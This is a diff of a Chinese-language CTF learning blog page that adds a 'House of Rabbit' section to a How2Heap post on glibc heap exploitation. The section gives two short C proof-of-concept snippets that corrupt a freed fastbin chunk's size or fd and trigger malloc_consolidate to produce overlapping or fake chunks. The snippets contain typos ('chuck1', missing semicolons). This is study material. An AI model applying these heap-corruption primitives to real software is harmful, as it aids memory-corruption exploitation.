@@ -21,13 +21,13 @@
     <meta name="description" content="">
     <meta name="description" content="House of Roman参考看雪上的这篇关于House of Roman的讲解，这个攻击看起来似乎可能比较实用？    glibc 2.29后Unsorted bin attack无法使用，添加了新的检查。且glibc 2.34后移除了__malloc_hook()。这个攻击大致分为以下几个步骤：   分配一个在malloc_hook附近的chunk，通过一个fastbin的double fr">
 <meta property="og:type" content="article">
-<meta property="og:title" content="How2Heap(6)——House of Roman">
+<meta property="og:title" content="How2Heap(6)——House of Roman &amp; House of Rabbit">
 <meta property="og:url" content="http://example.com/2024/04/17/How2Heap-6/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="House of Roman参考看雪上的这篇关于House of Roman的讲解，这个攻击看起来似乎可能比较实用？    glibc 2.29后Unsorted bin attack无法使用，添加了新的检查。且glibc 2.34后移除了__malloc_hook()。这个攻击大致分为以下几个步骤：   分配一个在malloc_hook附近的chunk，通过一个fastbin的double fr">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-04-17T11:34:21.000Z">
-<meta property="article:modified_time" content="2024-04-20T09:36:51.040Z">
+<meta property="article:modified_time" content="2024-04-20T10:07:01.660Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="heap">
@@ -36,7 +36,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>How2Heap(6)——House of Roman · Zj_W1nd&#39;s BLOG</title>
+    <title>How2Heap(6)——House of Roman &amp; House of Rabbit · Zj_W1nd&#39;s BLOG</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -262,7 +262,7 @@
                 <a href="/">Zj_W1nd&#39;s BLOG</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">How2Heap(6)——House of Roman</a>
+                <a href="#" class="post-name">How2Heap(6)——House of Roman & House of Rabbit</a>
             </div>
         </div>
     
@@ -308,7 +308,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                How2Heap(6)——House of Roman
+                How2Heap(6)——House of Roman & House of Rabbit
             <!-- 404 -->
             
         </h1>
@@ -527,6 +527,11 @@
 <li>最后将fastbin中的chunk1和3取出，再次取就取到了malloc_hook-0x23处的chunk<br>参考代码中如下注释：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当前的堆布局：</span></span><br><span class="line"><span class="comment">0x0：fastbin_victim - 大小为0x70</span></span><br><span class="line"><span class="comment">0x70：alignment_filler - 大小为0x90</span></span><br><span class="line"><span class="comment">0x100：fake_libc_chunk - 大小为0x70</span></span><br><span class="line"><span class="comment">0x170：leftover_main - 大小为0x20</span></span><br><span class="line"><span class="comment">0x190：relative_offset_heap - 大小为0x70</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bin布局：</span></span><br><span class="line"><span class="comment">      fastbin：fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">      unsorted：leftover_main</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
 这个例子后面部分不再多解释，这个poc前面的堆风水操作是冲着“尽可能少的爆破字节”进行设计的，针对我们没有任何地址泄露的情况使用。</li>
 </ul>
+<h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h2><p>How2heap里没有，看CTF Wiki看到的，思路比较简单，就跟着放在这里。<br>fastbin分配的时候对size的检查很严，但在调用<code>malloc_consolidate()</code>的时候反而一点都没检查size。因此这个漏洞主要实现的是通过篡改fastbin的size或fd，通过consolidate将我们伪造的chunk简单合法的放入bin中。下面放ctfwiki上的两个简单poc</p>
+<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><h4 id="修改size"><a href="#修改size" class="headerlink" title="修改size"></a>修改size</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602000</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602050</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="built_in">free</span>(chunk2);</span><br><span class="line"></span><br><span class="line">chunk1[<span class="number">-1</span>]=<span class="number">0xa1</span>; <span class="comment">//modify chunk1 size to be 0xa1</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>);  <span class="comment">//allocate a large chunk, trigger malloc consolidate</span></span><br><span class="line"><span class="comment">/*Chunk1 overlap with chunk2 now*/</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="修改fd"><a href="#修改fd" class="headerlink" title="修改fd"></a>修改fd</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602000</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//0x602050</span></span><br><span class="line"></span><br><span class="line">chunk2[<span class="number">1</span>]=<span class="number">0x31</span>; <span class="comment">//fake chunk size 0x30</span></span><br><span class="line">chunk2[<span class="number">7</span>]=<span class="number">0x21</span>  <span class="comment">//fake chunk&#x27;s next chunk</span></span><br><span class="line">chunk2[<span class="number">11</span>]=<span class="number">0x21</span> <span class="comment">//fake chunk&#x27;s next chunk&#x27;s next chuck</span></span><br><span class="line"><span class="comment">// 疑似为了绕过unlink</span></span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line">chuck1[<span class="number">0</span>]=<span class="number">0x602060</span>;<span class="comment">// modify the fd of chunk1</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment">(0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment">(0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment">(0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment">(0x50)     fastbin[3]: 0x602000 --&gt; 0x602060 (size error (0x30)) --&gt; 0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">5000</span>);<span class="comment">// malloc a  big chunk to trigger malloc consolidate</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>只要惦记着malloc_consolidate可能就够了吧。</p>
 
     </article>
     <!-- license -->
@@ -677,7 +682,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Roman"><span class="toc-number">1.</span> <span class="toc-text">House of Roman</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.1.</span> <span class="toc-text">POC</span></a></li></ol></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Roman"><span class="toc-number">1.</span> <span class="toc-text">House of Roman</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.1.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Rabbit"><span class="toc-number">2.</span> <span class="toc-text">House of Rabbit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-1"><span class="toc-number">2.1.</span> <span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9size"><span class="toc-number">2.1.1.</span> <span class="toc-text">修改size</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9fd"><span class="toc-number">2.1.2.</span> <span class="toc-text">修改fd</span></a></li></ol></li></ol></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -917,7 +922,7 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">04/17</span>
-            <a class="archive-post-title" href="/2024/04/17/How2Heap-6/">How2Heap(6)——House of Roman</a>
+            <a class="archive-post-title" href="/2024/04/17/How2Heap-6/">How2Heap(6)——House of Roman & House of Rabbit</a>
         </li>
     
         
